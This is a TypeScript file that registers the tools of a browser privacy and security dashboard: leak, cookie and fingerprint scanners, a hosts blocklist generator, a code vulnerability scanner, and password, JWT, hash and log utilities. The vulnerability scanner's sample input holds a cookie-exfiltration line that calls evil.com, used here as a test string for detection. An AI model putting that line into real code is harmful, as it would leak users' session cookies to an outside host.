import {
  Shield, Terminal, Wifi, Database, Globe, Zap,
  Fingerprint, Cookie, Eye, HardDrive, Search,
  FileText, Network, Key, Lock, Hash, FileCheck,
} from 'lucide-react';
import type { HackTool } from './types';
import {
  scanBrowserLeaks,
  scanLocalStorage,
  detectWebRTCLeak,
  inspectCookies,
  auditFingerprint,
  auditSovereignty,
  testDNSExposure,
  generateHostsFile,
} from './scanners';
import {
  scanForVulnerabilities,
  analyzePassword,
  analyzeLogs,
  identifyHash,
  decodeJWT,
  base64,
} from '../../engine/SecurityToolkit';

export const TOOLS: HackTool[] = [
  // ── REAL TOOLS ─────────────────────────────────────────────
  {
    id: 'leak_scan', name: 'Browser Leak Scanner', nameAr: 'ماسح تسريبات المتصفح',
    icon: Search, color: '#00FF00', category: 'real',
    description: 'Scans Performance API for tracking/telemetry connections',
    isReal: true, runner: scanBrowserLeaks,
    command: 'dragon_scan --performance-api --detect-telemetry', duration: 0,
  },
  {
    id: 'storage_forensic', name: 'Storage Forensics', nameAr: 'فحص التخزين المحلي',
    icon: HardDrive, color: '#00BFFF', category: 'real',
    description: 'Scans localStorage, sessionStorage, IndexedDB for tracking',
    isReal: true, runner: scanLocalStorage,
    command: 'dragon_forensic --localStorage --sessionStorage --indexedDB', duration: 0,
  },
  {
    id: 'webrtc_leak', name: 'WebRTC Candidate Audit', nameAr: 'تدقيق مرشحات WebRTC',
    icon: Wifi, color: '#FF6B00', category: 'real',
    description: 'Audits local ICE candidates without contacting third-party STUN services',
    isReal: true, runner: detectWebRTCLeak,
    command: 'dragon_leak --webrtc --local-candidates-only', duration: 0,
  },
  {
    id: 'cookie_inspect', name: 'Cookie Inspector', nameAr: 'فاحص الكوكيز',
    icon: Cookie, color: '#FFD700', category: 'real',
    description: 'Analyzes all cookies for tracking patterns',
    isReal: true, runner: inspectCookies,
    command: 'dragon_cookie --inspect --detect-tracking', duration: 0,
  },
  {
    id: 'fingerprint', name: 'Fingerprint Auditor', nameAr: 'مدقق البصمة الرقمية',
    icon: Fingerprint, color: '#FF0040', category: 'real',
    description: 'Shows everything your browser reveals about you',
    isReal: true, runner: auditFingerprint,
    command: 'dragon_fingerprint --canvas --webgl --navigator --media', duration: 0,
  },
  {
    id: 'sovereignty', name: 'Sovereignty Audit', nameAr: 'تدقيق السيادة',
    icon: Shield, color: '#00FF00', category: 'real',
    description: 'Full HAVEN sovereignty and PDPL compliance audit',
    isReal: true, runner: auditSovereignty,
    command: 'haven_audit --pdpl --nca-ecc --sovereignty --full', duration: 0,
  },
  {
    id: 'dns_exposure', name: 'Network Exposure Posture', nameAr: 'وضعية التعرض الشبكي',
    icon: Network, color: '#FF00FF', category: 'real',
    description: 'Explains local network exposure without contacting external reflectors',
    isReal: true, runner: testDNSExposure,
    command: 'dragon_dns --local-posture --no-external-reflectors', duration: 0,
  },
  {
    id: 'hosts_gen', name: 'Hosts File Generator', nameAr: 'مولد ملف الحظر',
    icon: FileText, color: '#00FFAA', category: 'real',
    description: 'Generates a hosts blocklist from detected telemetry',
    isReal: true, runner: generateHostsFile,
    command: 'dragon_hosts --generate --block-telemetry --download', duration: 0,
  },
  // ── SECURITY TOOLKIT (REAL) ────────────────────────────────
  {
    id: 'vuln_scan', name: 'Code Vulnerability Scanner', nameAr: 'ماسح الثغرات',
    icon: Terminal, color: '#FF0040', category: 'real',
    description: 'Scans code for XSS, SQLi, hardcoded secrets, eval usage',
    isReal: true,
    runner: async () => {
      const testCode = document.querySelector('.cm-content')?.textContent
        || localStorage.getItem('haven-ollama-active-endpoint') || 'const x = eval(userInput); fetch("http://evil.com?d=" + document.cookie);';
      const results = scanForVulnerabilities(testCode, 'active-file');
      if (results.length === 0) return '[+] No vulnerabilities detected. Code is clean.';
      return results.map(r => `[${r.severity}] ${r.type} at line ${r.line}: ${r.message}\n    ${r.snippet}`).join('\n\n');
    },
    command: 'haven_vuln_scan --xss --sqli --secrets --eval', duration: 0,
  },
  {
    id: 'password_audit', name: 'Password Strength Auditor', nameAr: 'مدقق قوة كلمة المرور',
    icon: Key, color: '#FFD700', category: 'real',
    description: 'Analyzes password strength with entropy calculation',
    isReal: true,
    runner: async () => {
      const pw = prompt('Enter password to audit (local only, never sent anywhere):') || 'P@ssw0rd123';
      const a = analyzePassword(pw);
      return [
        `[*] Password Strength Auditor`,
        `    Score: ${a.score}/100 (${a.strength})`,
        `    Entropy: ${a.entropy.toFixed(1)} bits`,
        `    Length: ${a.length}`,
        `    Crack Time: ${a.estimatedCrackTime}`,
        a.suggestions.length > 0 ? `    Suggestions:\n${a.suggestions.map(s => `      - ${s}`).join('\n')}` : '    No suggestions — strong password.',
      ].join('\n');
    },
    command: 'haven_password_audit --entropy --crack-time', duration: 0,
  },
  {
    id: 'jwt_decode', name: 'JWT Decoder', nameAr: 'فك تشفير JWT',
    icon: Lock, color: '#00BFFF', category: 'real',
    description: 'Decodes JWT tokens and checks expiration',
    isReal: true,
    runner: async () => {
      const token = prompt('Paste JWT token:') || '';
      if (!token.includes('.')) return '[!] Invalid JWT format. Must contain two dots.';
      try {
        const decoded = decodeJWT(token);
        return [
          '[+] JWT Decoded:',
          `    Subject: ${decoded.sub || 'N/A'}`,
          `    Issuer: ${decoded.iss || 'N/A'}`,
          `    Issued: ${decoded.iat ? new Date(decoded.iat * 1000).toISOString() : 'N/A'}`,
          `    Expires: ${decoded.exp ? new Date(decoded.exp * 1000).toISOString() : 'N/A'}`,
          `    Expired: ${decoded.expired ? 'YES' : 'NO'}`,
          `    All claims: ${JSON.stringify(decoded, null, 2)}`,
        ].join('\n');
      } catch (e) { return `[!] Failed to decode: ${e}`; }
    },
    command: 'haven_jwt --decode --check-expiry', duration: 0,
  },
  {
    id: 'hash_id', name: 'Hash Identifier', nameAr: 'محدد نوع الهاش',
    icon: Hash, color: '#FF00FF', category: 'real',
    description: 'Identifies hash types (MD5, SHA-1, SHA-256, bcrypt, etc.)',
    isReal: true,
    runner: async () => {
      const hash = prompt('Paste a hash to identify:') || '';
      if (!hash.trim()) return '[!] No hash provided.';
      const types = identifyHash(hash.trim());
      if (types.length === 0) return `[?] Unknown hash format: ${hash.slice(0, 40)}...`;
      return [`[+] Hash Identifier Results:`, `    Input: ${hash.slice(0, 60)}${hash.length > 60 ? '...' : ''}`, `    Possible types:`, ...types.map(t => `      - ${t}`)].join('\n');
    },
    command: 'haven_hash --identify', duration: 0,
  },
  {
    id: 'base64_tool', name: 'Base64 Encode/Decode', nameAr: 'ترميز/فك Base64',
    icon: FileCheck, color: '#00FFAA', category: 'real',
    description: 'Encode or decode Base64 strings',
    isReal: true,
    runner: async () => {
      const input = prompt('Enter text (prefix with "d:" to decode, otherwise encodes):') || '';
      if (input.startsWith('d:')) {
        const decoded = base64.decode(input.slice(2));
        return `[+] Decoded:\n${decoded}`;
      }
      return `[+] Encoded:\n${base64.encode(input)}`;
    },
    command: 'haven_base64 --encode / --decode', duration: 0,
  },
  {
    id: 'log_analyzer', name: 'Log Analyzer', nameAr: 'محلل السجلات',
    icon: Eye, color: '#FF6B00', category: 'real',
    description: 'Analyzes log text for failed logins, IPs, errors',
    isReal: true,
    runner: async () => {
      const logText = prompt('Paste log lines (or sample will be used):') || 'Failed password for admin from 192.168.1.50\nFailed password for root from 10.0.0.5\nAccepted publickey for user\nERROR: Connection refused\nWARNING: disk space low';
      const a = analyzeLogs(logText);
      return [
        `[*] Log Analysis:`,
        `    Total lines: ${a.totalLines}`,
        `    Errors: ${a.errorCount}`,
        `    Warnings: ${a.warningCount}`,
        `    Failed logins: ${a.failedLogins}`,
        `    Unique IPs: ${a.uniqueIPs.join(', ') || 'none'}`,
        a.suspiciousPatterns.length > 0 ? `    Suspicious:\n${a.suspiciousPatterns.map(p => `      [!] ${p}`).join('\n')}` : '    No suspicious patterns.',
      ].join('\n');
    },
    command: 'haven_log --analyze --detect-brute-force', duration: 0,
  },
];

export const CATEGORY_COLORS: Record<string, { color: string; label: string }> = {
  real:    { color: '#00FF00', label: 'REAL' },
  recon:   { color: '#FFD700', label: 'RECON' },
  exploit: { color: '#FF0040', label: 'SIM' },
  defense: { color: '#00BFFF', label: 'SIM' },
  audit:   { color: '#00FF00', label: 'AUDIT' },
};
